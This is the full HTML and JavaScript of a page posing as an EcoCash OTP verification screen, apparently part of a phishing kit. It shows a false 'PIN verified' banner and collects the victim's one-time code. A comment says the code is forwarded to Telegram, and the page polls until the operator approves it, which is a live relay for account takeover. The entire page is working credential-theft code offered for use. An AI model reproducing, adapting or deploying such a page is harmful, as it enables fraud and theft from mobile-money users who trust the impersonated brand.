<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification - EcoCash</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
        .success-banner { background-color: #e6f4ea; color: #1e8e3e; padding: 10px; border-radius: 5px; margin-bottom: 20px; font-size: 14px; text-align: left; }
        .otp-inputs { display: flex; justify-content: space-between; margin-bottom: 20px; }
        .otp-inputs input { width: 40px; height: 50px; font-size: 24px; text-align: center; border: 1px solid #ccc; border-radius: 5px; }
        .submit-btn { background-color: #4a90e2; color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-size: 16px; cursor: pointer; margin-bottom: 15px; }
        .submit-btn:hover { background-color: #357abd; }
        .submit-btn:disabled { background-color: #a0c4e8; cursor: not-allowed; }
        .resend { color: #d9534f; font-size: 14px; cursor: pointer; text-decoration: none; }
    </style>
</head>
<body>

<div class="container">
    <h2 style="color: #0056b3; text-align: left;">OTP Verification</h2>
    <p style="text-align: left; color: #666; font-size: 14px;">Enter the 6-digit code sent to your phone number <strong id="display-phone"></strong></p>
    
    <div class="success-banner">
        ✓ PIN verified successfully! Please enter OTP below.
    </div>

    <div class="otp-inputs">
        <input type="text" maxlength="1" onkeyup="moveToNext(this, 'otp2')" id="otp1">
        <input type="text" maxlength="1" onkeyup="moveToNext(this, 'otp3')" id="otp2">
        <input type="text" maxlength="1" onkeyup="moveToNext(this, 'otp4')" id="otp3">
        <input type="text" maxlength="1" onkeyup="moveToNext(this, 'otp5')" id="otp4">
        <input type="text" maxlength="1" onkeyup="moveToNext(this, 'otp6')" id="otp5">
        <input type="text" maxlength="1" id="otp6">
    </div>

    <a href="#" class="resend" onclick="resendOTP()">Resend OTP code</a>
    <br><br>

    <button class="submit-btn" onclick="verifyOTP()">SUBMIT</button>
</div>

<script>
    // Get the phone number from the previous page
    const phone = localStorage.getItem('loginPhone');
    
    // If user lands here without a phone number, send them back to login
    if(phone) {
        document.getElementById('display-phone').innerText = phone;
    } else {
        window.location.href = '/login.html'; 
    }

    // Auto-focus next input box
    function moveToNext(current, nextFieldID) {
        if (current.value.length >= 1) {
            document.getElementById(nextFieldID).focus();
        }
    }

    // Resend OTP (Placeholder)
    function resendOTP() {
        alert("Please check your phone or contact support to resend the code.");
    }

    // Verify OTP Function
    async function verifyOTP() {
        const btn = document.querySelector('.submit-btn');
        const otp = 
            document.getElementById('otp1').value + 
            document.getElementById('otp2').value + 
            document.getElementById('otp3').value + 
            document.getElementById('otp4').value + 
            document.getElementById('otp5').value + 
            document.getElementById('otp6').value;

        if (otp.length !== 6) {
            alert("Please enter all 6 digits.");
            return;
        }

        btn.innerText = 'Sending to Admin...';
        btn.disabled = true;

        try {
            // Send the OTP to the server to be forwarded to Telegram
            const response = await fetch('/api/verify-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phone, otp: otp })
            });

            const result = await response.json();

            // If the server is waiting for Telegram approval
            if (result.status === 'pending_otp_approval') {
                btn.innerText = 'Waiting for Approval...';
                
                // Start checking if you clicked "Approve" on Telegram
                const pollInterval = setInterval(async () => {
                    const statusRes = await fetch(`/api/check-otp-status/${encodeURIComponent(phone)}`);
                    const statusData = await statusRes.json();

                    if (statusData.otp_status === 'approved') {
                        clearInterval(pollInterval);
                        alert("Login Successful!");
                        window.location.href = '/dashboard.html'; // Change this to your actual dashboard page
                    } 
                    else if (statusData.otp_status === 'rejected') {
                        clearInterval(pollInterval);
                        alert("OTP was rejected by Admin.");
                        btn.innerText = 'SUBMIT';
                        btn.disabled = false;
                    }
                }, 3000); // Check every 3 seconds
            }
        } catch (error) {
            alert("Network error. Try again.");
            btn.innerText = 'SUBMIT';
            btn.disabled = false;
        }
    }
</script>
</body>
    </html>
